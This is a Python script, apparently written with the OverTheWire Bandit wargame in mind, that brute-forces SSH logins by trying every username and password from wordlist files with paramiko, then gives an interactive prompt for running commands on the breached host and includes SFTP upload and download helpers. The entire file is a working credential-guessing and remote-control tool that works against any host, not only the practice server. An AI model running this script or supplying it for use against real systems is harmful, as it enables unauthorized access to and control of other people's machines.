#!./venv/bin/python

import paramiko
import argparse
import os
import socket
import time


# ssh info bandit.labs.overthewire.org p 2220
def cprint(*args, color="white", **kwargs):
    d = {"red": "\u001b[31m", "black": "\u001b[30m", "green": "\u001b[32m", "yellow": "\u001b[33m",
         "blue": "\u001b[34m", "white": "\u001b[37m", "end": "\u001b[0m"}

    if color not in d:
        for k in d:
            if color in k:
                color = k
                break
        else:
            color = "white"

    print(d[color], *args, d["end"], **kwargs)


def download_file(client: paramiko.SSHClient, remote_path, local_path):
    sftp: paramiko.SFTP = client.open_sftp()
    sftp.get(remote_path, local_path)
    sftp.close()


def upload_file(client: paramiko.SSHClient, remote_path, local_path):
    sftp: paramiko.SFTP = client.open_sftp()
    sftp.put(local_path, remote_path)
    sftp.close()


def args():
    parser = argparse.ArgumentParser("ssh brute force")
    parser.add_argument("host")
    parser.add_argument("-f", "--passwords", help="passwords file", default="pass.txt")
    parser.add_argument("-u", "--users", help="users file", default="user.txt")
    parser.add_argument("-p", "--port", help="port", default=22, type=int)

    return parser.parse_args()


options = args()
if not os.path.exists(options.passwords) or not os.path.exists(options.users):
    cprint("file not found", color="red")
    exit(0)
users = open(options.users)
passwords = open(options.passwords)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = options.host
port = options.port
for user in users:
    try:
        for password in passwords:
            try:
                ssh.connect(hostname=ip, username=user.strip(), password=password.strip(), timeout=3, port=port)
                cprint(f"login success {user.strip()}, {password.strip()}", color="g")
                while True:
                    command = input("input command to execute via ssh>>")
                    if command == "exit":
                        ssh.close()
                        exit(0)
                    else:
                        stdin, stdout, stderr = ssh.exec_command(command)
                        cprint(f"out:{stdout.read().decode()}", color="green")
                        err = stderr.read().decode()
                        if err:
                            cprint(f"err:{err}", color="red")
            except paramiko.AuthenticationException as e:
                cprint(f"can't login with credentials: {user.strip()}, {password.strip()}, {e}", color="y")

            except (socket.error, paramiko.SSHException) as e:
                cprint(f"error {user.strip()}\n{e}", color="red")
                cprint("wating 5 sec", color="y")
                time.sleep(5)

    except Exception as e:
        cprint(f"error {e}", color="r")
